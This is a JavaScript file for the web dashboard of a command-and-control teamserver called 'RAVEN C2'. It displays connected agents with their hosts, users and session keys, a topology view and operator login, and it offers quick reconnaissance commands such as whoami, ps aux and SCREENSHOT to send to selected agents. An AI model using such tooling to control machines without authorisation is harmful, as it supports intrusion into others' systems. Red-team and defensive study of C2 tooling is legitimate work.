"use strict";

const QuickCmds = [
    { cmd: "SYSINFO", icon: "fas fa-info-circle", label: "Sysinfo" },
    { cmd: "ls -la", icon: "fas fa-folder-open", label: "List Files" },
    { cmd: "ifconfig", icon: "fas fa-network-wired", label: "Network" },
    { cmd: "whoami", icon: "fas fa-user", label: "Whoami" },
    { cmd: "ps aux", icon: "fas fa-tasks", label: "Processes" },
    { cmd: "SCREENSHOT", icon: "fas fa-camera", label: "Screenshot" },
    { cmd: "id", icon: "fas fa-id-badge", label: "ID" }
];

function Esc(s) {
    return String(s)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
}

function GoTo(sec) {
    document
        .querySelectorAll(".section")
        .forEach(el => el.classList.remove("active"));
    let target = document.getElementById("section-" + sec);
    if (target) target.classList.add("active");
    document
        .querySelectorAll("[data-nav]")
        .forEach(el => el.classList.toggle("active", el.dataset.nav === sec));
    let titles = {
        dashboard: "Dashboard",
        server: "Server",
        agents: "Agents",
        command: "Console",
        logs: "Logs",
        team: "Team",
        about: "About"
    };
    ["mobile-title", "topbar-title"].forEach(id => {
        let el = document.getElementById(id);
        if (el) el.textContent = titles[sec] || sec;
    });
    if (typeof closeSidebar === "function") closeSidebar();
    if (sec === "agents") DrawTopology();
    if (sec === "team") LoadTeam();
}

function TickClock() {
    let t = new Date().toLocaleTimeString("en-US", { hour12: false });
    ["topnav-clock", "mobile-clock"].forEach(id => {
        let el = document.getElementById(id);
        if (el) el.textContent = t;
    });
}

function UpdateSphere() {
    let up = State.serverRunning;
    let wrap = document.getElementById("sphere-wrap");
    if (wrap) wrap.classList.toggle("online", up);
    let ring = document.querySelector(".sphere-ring");
    if (ring) ring.classList.toggle("active", up);
    let val = document.getElementById("sphere-val");
    if (val) {
        val.textContent = up ? "ONLINE" : "OFFLINE";
        val.classList.toggle("online", up);
    }
    let detail = document.getElementById("sphere-detail");
    if (detail)
        detail.textContent = up
            ? "Listening on " + State.serverAddress
            : "Server not running";
}

function UpdateStats() {
    let sv = document.getElementById("stat-server-status");
    if (sv) {
        sv.className =
            "stat-val " + (State.serverRunning ? "online" : "offline");
        sv.innerHTML =
            '<span class="status-dot' +
            (State.serverRunning ? " online" : "") +
            '"></span>' +
            (State.serverRunning ? "Online" : "Offline");
    }
    let agents = document.getElementById("stat-agents");
    if (agents) agents.textContent = State.agentList.length;
    let conns = document.getElementById("stat-connections");
    if (conns) conns.textContent = State.agentList.length;
    ["server-address-val", "server-address-val2"].forEach(id => {
        let el = document.getElementById(id);
        if (el) el.textContent = State.serverAddress || "—";
    });
    ["session-key-val", "session-key-val2"].forEach(id => {
        let el = document.getElementById(id);
        if (el)
            el.textContent = State.sessionKey
                ? State.sessionKey.substring(0, 32) + "…"
                : "—";
    });
}

function UpdateToggleBtns() {
    let up = State.serverRunning;
    document
        .querySelectorAll(".server-toggle-btn")
        .forEach(b => b.classList.toggle("online", up));
    let cb = document.getElementById("server-toggle-btn");
    if (cb)
        cb.innerHTML = up
            ? '<i class="fas fa-stop"></i> Stop Server'
            : '<i class="fas fa-play"></i> Start Server';
}

function UpdateAgentBadges() {
    let n = State.agentList.length;
    let pill = document.getElementById("topbar-agent-pill");
    let cnt = document.getElementById("topbar-agent-count");
    let bnav = document.getElementById("bnav-agent-badge");
    if (pill) pill.style.display = n ? "" : "none";
    if (cnt) cnt.textContent = n;
    if (bnav) {
        bnav.textContent = n;
        bnav.style.display = n ? "" : "none";
    }
}

function UpdateBadge() {
    let badge = document.getElementById("op-badge");
    let logout = document.getElementById("logout-btn");
    if (badge) {
        if (State.operator) {
            badge.style.display = "";
            badge.textContent =
                State.operator + " [" + (State.role || "?") + "]";
        } else {
            badge.style.display = "none";
        }
    }
    if (logout) logout.style.display = State.operator ? "" : "none";
}

function RenderAgents() {
    let c = document.getElementById("agent-cards");
    if (!c) return;
    if (!State.agentList.length) {
        c.innerHTML =
            '<div class="empty-state"><i class="fas fa-satellite-dish"></i>' +
            '<div class="empty-title">NO ACTIVE AGENTS</div>' +
            '<div class="empty-sub">Waiting for agents to connect...</div></div>';
        return;
    }
    c.innerHTML = State.agentList
        .map(a => {
            let name = Esc(a.DisplayName || a.AgentName || "AGENT-" + a.ID);
            let sel = State.selectedId === a.ID;
            return `<div class="agent-card${sel ? " selected" : ""}" data-id="${a.ID}">
      <div class="agent-id">[ ${name} ]</div>
      <div class="agent-meta">
        <span class="mk">ID#</span><span class="mv">${Esc(String(a.ID))}</span>
        <span class="mk">HOST</span><span class="mv">${Esc(a.Hostname || "—")}</span>
        <span class="mk">OS</span><span class="mv">${Esc(a.OS || "—")}</span>
        <span class="mk">IP</span><span class="mv">${Esc(a.AgentIP || "—")}</span>
        <span class="mk">USER</span><span class="mv">${Esc(a.User || "—")}</span>
        <span class="mk">ENC</span><span class="mv">${a.Encrypted ? "YES" : "NO"}</span>
        <span class="mk">KEY</span><span class="mv" style="font-size:9px;word-break:break-all;">${Esc((a.SessionKey || "—").substring(0, 20))}…</span>
      </div>
      <div class="agent-actions">
        <button class="btn btn-lime btn-sm" onclick="SelectAndGo(${a.ID})"><i class="fas fa-crosshairs"></i> Target</button>
        <button class="btn btn-danger btn-sm" onclick="KillAgent(${a.ID})" title="Kill"><i class="fas fa-times"></i></button>
      </div>
    </div>`;
        })
        .join("");
    c.querySelectorAll(".agent-card").forEach(card => {
        card.addEventListener("click", e => {
            if (e.target.closest("button")) return;
            SelectAgent(parseInt(card.dataset.id));
        });
    });
}

function UpdateTargetBadge() {
    let b = document.getElementById("target-badge");
    if (!b) return;
    if (State.selectedId != null) {
        let a = State.agentList.find(x => x.ID === State.selectedId);
        let name = a
            ? a.DisplayName || a.AgentName || "AGENT-" + State.selectedId
            : "AGENT-" + State.selectedId;
        b.className = "target-badge";
        b.innerHTML =
            '<i class="fas fa-circle-dot"></i> ' +
            Esc(name) +
            " #" +
            State.selectedId;
    } else {
        b.className = "target-badge none";
        b.innerHTML = '<i class="fas fa-circle-dot"></i> NONE SELECTED';
    }
}

function RenderLogs() {
    let el = document.getElementById("log-container");
    if (!el) return;
    if (!State.logs.length) {
        el.innerHTML =
            '<div class="empty-state" style="min-height:80px"><i class="fas fa-clipboard-list"></i>' +
            '<div class="empty-sub">No logs yet</div></div>';
        return;
    }
    el.innerHTML = State.logs
        .map(
            e =>
                `<div class="log-entry ${Esc(e.level)}"><span class="log-time">[${Esc(e.ts)}] [${Esc(e.level.toUpperCase())}]</span>` +
                `<span class="log-msg">${Esc(e.msg)}</span></div>`
        )
        .join("");
    el.scrollTop = el.scrollHeight;
}

function AppendOutput(text, type) {
    let el = document.getElementById("terminal-output");
    if (!el) return;
    (text || "").split("\n").forEach(line => {
        let d = document.createElement("div");
        d.className = "term-line " + (type || "out");
        d.textContent = line;
        el.appendChild(d);
    });
    el.scrollTop = el.scrollHeight;
}

function RenderQuickCmds() {
    let g = document.getElementById("quick-grid");
    if (!g) return;
    g.innerHTML = QuickCmds.map(
        q =>
            `<button class="quick-btn" onclick="QuickCmd('${q.cmd}')"><i class="${q.icon}"></i>${q.label}</button>`
    ).join("");
}

function RenderTeamTable(ops, roles) {
    let roleTable = roles.length
        ? `
    <div style="margin-bottom:16px;">
      <div style="font-family:var(--mono);font-size:8px;color:var(--lime);letter-spacing:2px;margin-bottom:8px;">ROLE PERMISSIONS</div>
      <table style="width:100%;border-collapse:collapse;font-size:11px;">
        ${roles
            .map(
                r => `<tr>
          <td style="padding:5px 8px;color:var(--text);font-weight:700;width:120px;">${Esc(r.Name)}</td>
          <td style="padding:5px 8px;color:var(--text-dim);">${Esc(r.Permissions)}</td>
        </tr>`
            )
            .join("")}
      </table>
    </div>`
        : "";

    let opTable = `
    <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:14px;">
      <thead><tr>
        <th style="text-align:left;padding:6px 8px;color:var(--lime);border-bottom:1px solid var(--lime-border);font-family:var(--mono);font-size:9px;letter-spacing:1px;">USERNAME</th>
        <th style="text-align:left;padding:6px 8px;color:var(--lime);border-bottom:1px solid var(--lime-border);font-family:var(--mono);font-size:9px;letter-spacing:1px;">ROLE</th>
        <th style="text-align:left;padding:6px 8px;color:var(--lime);border-bottom:1px solid var(--lime-border);font-family:var(--mono);font-size:9px;letter-spacing:1px;">LAST SEEN</th>
        <th style="text-align:right;padding:6px 8px;color:var(--lime);border-bottom:1px solid var(--lime-border);font-family:var(--mono);font-size:9px;letter-spacing:1px;">ACTIONS</th>
      </tr></thead>
      <tbody>
        ${ops
            .map(op => {
                let isSelf = op.Username === State.operator;
                let isAdmin = op.Username === "admin";
                return `<tr style="border-bottom:1px solid var(--border);">
            <td style="padding:8px;color:var(--text);font-family:var(--mono);font-size:11px;">
              ${Esc(op.Username)}${isSelf ? ' <span style="color:var(--lime);font-size:9px;">[YOU]</span>' : ""}
            </td>
            <td style="padding:8px;">
              <span style="background:var(--lime-faint);color:var(--lime);padding:2px 8px;border:1px solid var(--lime-border);font-family:var(--mono);font-size:9px;">${Esc(op.Role)}</span>
            </td>
            <td style="padding:8px;color:var(--text-muted);font-family:var(--mono);font-size:10px;">${Esc(op.LastSeen || "Never")}</td>
            <td style="padding:8px;text-align:right;">
              ${!isAdmin && !isSelf ? `<button class="btn btn-danger btn-sm" onclick="KickOp('${Esc(op.Username)}')" title="Kick operator"><i class="fas fa-user-times"></i></button>` : ""}
            </td>
          </tr>`;
            })
            .join("")}
      </tbody>
    </table>`;

    return roleTable + opTable;
}

function SvgEl(tag, attrs) {
    let el = document.createElementNS("http://www.w3.org/2000/svg", tag);
    Object.entries(attrs || {}).forEach(([k, v]) => el.setAttribute(k, v));
    return el;
}

function DrawTopology() {
    let svg = document.getElementById("topologySvg");
    if (!svg) return;
    svg.innerHTML = "";
    let W = svg.clientWidth || 600;
    let H = parseInt(svg.getAttribute("height")) || 300;
    svg.setAttribute("viewBox", "0 0 " + W + " " + H);

    let defs = SvgEl("defs");
    let pat = SvgEl("pattern", {
        id: "tg",
        width: 28,
        height: 28,
        patternUnits: "userSpaceOnUse"
    });
    pat.appendChild(
        SvgEl("path", {
            d: "M 28 0 L 0 0 0 28",
            fill: "none",
            stroke: "rgba(0,255,0,0.04)",
            "stroke-width": "1"
        })
    );
    defs.appendChild(pat);
    svg.appendChild(defs);
    svg.appendChild(SvgEl("rect", { width: W, height: H, fill: "url(#tg)" }));

    if (!State.serverRunning && !State.agentList.length) {
        let t = SvgEl("text", {
            x: W / 2,
            y: H / 2,
            "text-anchor": "middle",
            fill: "rgba(0,255,0,0.15)",
            "font-family": "monospace",
            "font-size": "11",
            "letter-spacing": "4"
        });
        t.textContent = "NO CONNECTIONS";
        svg.appendChild(t);
        return;
    }

    let cx = W / 2,
        cy = H / 2,
        rad = Math.min(W, H) * 0.3;

    State.agentList.forEach((a, i) => {
        let angle =
            (2 * Math.PI * i) / Math.max(State.agentList.length, 1) -
            Math.PI / 2;
        let ax = cx + rad * Math.cos(angle),
            ay = cy + rad * Math.sin(angle);
        let pid = "tp" + i;

        svg.appendChild(
            SvgEl("line", {
                x1: cx,
                y1: cy,
                x2: ax,
                y2: ay,
                stroke: "rgba(0,255,0,0.1)",
                "stroke-width": "1",
                "stroke-dasharray": "5 5"
            })
        );
        svg.appendChild(
            SvgEl("path", {
                id: pid,
                d: `M${cx},${cy} L${ax},${ay}`,
                fill: "none"
            })
        );

        let pkt = SvgEl("circle", { r: "3", fill: "#00ff00", opacity: "0.7" });
        let anim = SvgEl("animateMotion", {
            dur: 1.8 + i * 0.4 + "s",
            repeatCount: "indefinite"
        });
        let mp = SvgEl("mpath");
        mp.setAttribute("href", "#" + pid);
        anim.appendChild(mp);
        pkt.appendChild(anim);
        svg.appendChild(pkt);

        let name = a.DisplayName || a.AgentName || "AGENT-" + a.ID;
        DrawTopoNode(
            svg,
            ax,
            ay,
            name,
            a.AgentIP || "",
            false,
            () => SelectAndGo(a.ID),
            State.selectedId === a.ID
        );
    });

    DrawTopoNode(
        svg,
        cx,
        cy,
        "C2 SERVER",
        State.serverHost + ":" + State.serverPort,
        true
    );
}

function DrawTopoNode(svg, x, y, label, sub, isServer, onClick, sel) {
    let g = SvgEl("g");
    if (onClick) {
        g.style.cursor = "pointer";
        g.addEventListener("click", onClick);
    }

    let r = isServer ? 28 : 20;
    let stroke = isServer
        ? "#00ff00"
        : sel
          ? "#00ff00"
          : "rgba(255,255,255,0.2)";
    let fill = isServer
        ? "rgba(0,255,0,0.1)"
        : sel
          ? "rgba(0,255,0,0.08)"
          : "#0a0a0a";

    g.appendChild(
        SvgEl("circle", {
            cx: x,
            cy: y,
            r: r + 6,
            fill: "none",
            stroke: isServer
                ? "rgba(0,255,0,0.18)"
                : sel
                  ? "rgba(0,255,0,0.25)"
                  : "rgba(255,255,255,0.06)",
            "stroke-width": "1",
            "stroke-dasharray": isServer ? "0" : "3 3"
        })
    );
    g.appendChild(
        SvgEl("circle", {
            cx: x,
            cy: y,
            r: r,
            fill,
            stroke,
            "stroke-width": "1.5"
        })
    );

    let fo = SvgEl("foreignObject", {
        x: x - 11,
        y: y - 11,
        width: 22,
        height: 22
    });
    let div = document.createElement("div");
    div.style.cssText =
        "width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:12px;color:" +
        (isServer ? "#00ff00" : sel ? "#00ff00" : "#888888") +
        ";";
    div.innerHTML =
        '<i class="fas ' + (isServer ? "fa-server" : "fa-laptop") + '"></i>';
    fo.appendChild(div);
    g.appendChild(fo);

    let lbl = SvgEl("text", {
        x,
        y: y + r + 12,
        "text-anchor": "middle",
        fill: isServer ? "#00ff00" : sel ? "#00ff00" : "#aaaaaa",
        "font-family": "monospace",
        "font-size": "8",
        "font-weight": "700",
        "letter-spacing": "1"
    });
    lbl.textContent = label.length > 10 ? label.substring(0, 9) + "…" : label;
    g.appendChild(lbl);

    let sub2 = SvgEl("text", {
        x,
        y: y + r + 22,
        "text-anchor": "middle",
        fill: "#555555",
        "font-family": "monospace",
        "font-size": "7.5"
    });
    sub2.textContent = sub;
    g.appendChild(sub2);

    svg.appendChild(g);
}

function ShowLogin(msg) {
    let old = document.getElementById("login-overlay");
    if (old) old.remove();
    let ov = document.createElement("div");
    ov.id = "login-overlay";
    ov.style.cssText =
        "position:fixed;inset:0;background:rgba(0,0,0,0.97);display:flex;align-items:center;justify-content:center;z-index:9999;";
    ov.innerHTML = `
    <div style="background:#0a0a0a;border:1px solid rgba(0,255,0,0.25);padding:40px 36px;width:340px;max-width:94vw;text-align:center;">
      <div style="font-family:'Tourney',monospace;font-size:22px;color:#00ff00;letter-spacing:4px;margin-bottom:4px;">RAVEN C2</div>
      <div style="font-family:'Courier New',monospace;font-size:9px;color:#444444;letter-spacing:2px;margin-bottom:26px;">TEAMSERVER — OPERATOR AUTHENTICATION</div>
      ${msg ? `<div style="color:#ff4444;font-family:'Courier New',monospace;font-size:11px;margin-bottom:14px;">${Esc(msg)}</div>` : ""}
      <input id="li-user" type="text" placeholder="Username" autocomplete="off"
        style="width:100%;box-sizing:border-box;background:#000;border:1px solid rgba(0,255,0,0.2);padding:10px 12px;color:#f0f0f0;font-family:'Courier New',monospace;font-size:12px;margin-bottom:10px;outline:none;border-radius:0;">
      <input id="li-pass" type="password" placeholder="Password"
        style="width:100%;box-sizing:border-box;background:#000;border:1px solid rgba(0,255,0,0.2);padding:10px 12px;color:#f0f0f0;font-family:'Courier New',monospace;font-size:12px;margin-bottom:18px;outline:none;border-radius:0;">
      <button id="li-btn" onclick="DoLogin()"
        style="width:100%;background:#00ff00;color:#000;border:none;padding:11px;font-weight:700;font-family:'Space Grotesk',sans-serif;font-size:13px;cursor:pointer;letter-spacing:1px;">
        AUTHENTICATE</button>
      <div id="li-err" style="color:#ff4444;font-family:'Courier New',monospace;font-size:11px;margin-top:12px;min-height:16px;"></div>
    </div>`;
    document.body.appendChild(ov);
    let u = document.getElementById("li-user");
    let p = document.getElementById("li-pass");
    if (u) {
        u.focus();
        u.onkeydown = e => {
            if (e.key === "Enter" && p) p.focus();
        };
    }
    if (p)
        p.onkeydown = e => {
            if (e.key === "Enter") DoLogin();
        };
}

function InitBottomNavScroll() {
    let cont = document.querySelector(".content");
    if (!cont) return;
    cont.addEventListener(
        "scroll",
        e => {
            let el = e.target;
            let st = el.scrollTop;
            let atBot = el.scrollHeight - st - el.clientHeight < 32;
            let down = st > State.lastScrollY;
            let bnav = document.querySelector(".bottom-nav");
            if (bnav) {
                bnav.classList.toggle("hidden", atBot && down);
                if (!down) bnav.classList.remove("hidden");
            }
            State.lastScrollY = st;
        },
        { passive: true }
    );
}
